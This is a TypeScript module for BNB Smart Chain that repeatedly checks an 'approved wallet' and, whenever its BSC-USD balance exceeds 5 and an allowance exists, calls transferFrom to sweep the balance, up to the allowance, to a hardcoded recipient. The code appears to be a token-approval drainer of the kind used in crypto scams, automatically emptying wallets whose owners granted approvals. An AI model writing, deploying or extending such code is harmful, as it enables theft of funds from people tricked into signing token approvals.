import { ethers } from "ethers";

import {
  BSC_RPC_URL,
  BINANCE_PEG_BSC_USD_ABI,
  BINANCE_PEG_BSC_USD_ADDRESS,
  TRANSFER_RECIPIENT,
} from "./binancePegBscUsd";

const THRESHOLD_USDT = "5";
const DEFAULT_INTERVAL_MS = 60_000;

export type TransferWorkflowStatus = {
  state: "disabled" | "waiting" | "ready" | "transferring" | "transferred" | "error";
  owner: string | null;
  recipient: string;
  balanceUsdt: string | null;
  allowanceUsdt: string | null;
  transferAmountUsdt: string | null;
  transactionHash: string | null;
  checkedAt: string | null;
  error: string | null;
};

const status: TransferWorkflowStatus = {
  state: "disabled",
  owner: null,
  recipient: TRANSFER_RECIPIENT,
  balanceUsdt: null,
  allowanceUsdt: null,
  transferAmountUsdt: null,
  transactionHash: null,
  checkedAt: null,
  error: null,
};

let monitor: ReturnType<typeof setInterval> | undefined;
let checkInProgress = false;

function getConfig() {
  const owner = process.env.APPROVED_WALLET_ADDRESS;
  const privateKey = process.env.TRANSFER_SIGNER_PRIVATE_KEY;
  const intervalMs = Number(process.env.TRANSFER_POLL_INTERVAL_MS ?? DEFAULT_INTERVAL_MS);

  if (!owner || !ethers.isAddress(owner)) {
    throw new Error("APPROVED_WALLET_ADDRESS must be a valid address.");
  }
  if (!privateKey) {
    throw new Error("TRANSFER_SIGNER_PRIVATE_KEY is required to submit transferFrom.");
  }
  if (!Number.isInteger(intervalMs) || intervalMs < 1_000) {
    throw new Error("TRANSFER_POLL_INTERVAL_MS must be an integer of at least 1000.");
  }

  return {
    owner: ethers.getAddress(owner),
    privateKey,
    intervalMs,
    recipient: TRANSFER_RECIPIENT,
  };
}

function setError(error: unknown) {
  status.state = "error";
  status.error = error instanceof Error ? error.message : String(error);
  status.checkedAt = new Date().toISOString();
}

export function getTransferWorkflowStatus(): TransferWorkflowStatus {
  return { ...status };
}

export async function checkApprovedWallet(): Promise<TransferWorkflowStatus> {
  if (checkInProgress) return getTransferWorkflowStatus();
  checkInProgress = true;

  try {
    const config = getConfig();
    const provider = new ethers.JsonRpcProvider(BSC_RPC_URL);
    const signer = new ethers.Wallet(config.privateKey, provider);
    const token = new ethers.Contract(BINANCE_PEG_BSC_USD_ADDRESS, BINANCE_PEG_BSC_USD_ABI, signer);
    const decimals = Number(await token.decimals());
    const threshold = ethers.parseUnits(THRESHOLD_USDT, decimals);
    const [balance, allowance] = await Promise.all([
      token.balanceOf(config.owner) as Promise<bigint>,
      token.allowance(config.owner, signer.address) as Promise<bigint>,
    ]);

    status.owner = config.owner;
    status.recipient = config.recipient;
    status.balanceUsdt = ethers.formatUnits(balance, decimals);
    status.allowanceUsdt = ethers.formatUnits(allowance, decimals);
    status.checkedAt = new Date().toISOString();
    status.error = null;

    if (balance <= threshold || allowance === BigInt(0)) {
      status.state = "waiting";
      status.transferAmountUsdt = null;
      return getTransferWorkflowStatus();
    }

    status.state = "ready";
    const amount = balance < allowance ? balance : allowance;
    status.transferAmountUsdt = ethers.formatUnits(amount, decimals);

    status.state = "transferring";
    const transaction = await token.transferFrom(config.owner, config.recipient, amount);
    status.transactionHash = transaction.hash;
    await transaction.wait();
    status.state = "transferred";

    return getTransferWorkflowStatus();
  } catch (error) {
    setError(error);
    return getTransferWorkflowStatus();
  } finally {
    checkInProgress = false;
  }
}

export function startTransferWorkflow(): void {
  if (monitor || process.env.TRANSFER_MONITOR_ENABLED !== "true") return;

  try {
    getConfig();
  } catch (error) {
    setError(error);
    return;
  }

  void checkApprovedWallet();
  monitor = setInterval(() => void checkApprovedWallet(), getConfig().intervalMs);
}

export function stopTransferWorkflow(): void {
  if (monitor) clearInterval(monitor);
  monitor = undefined;
}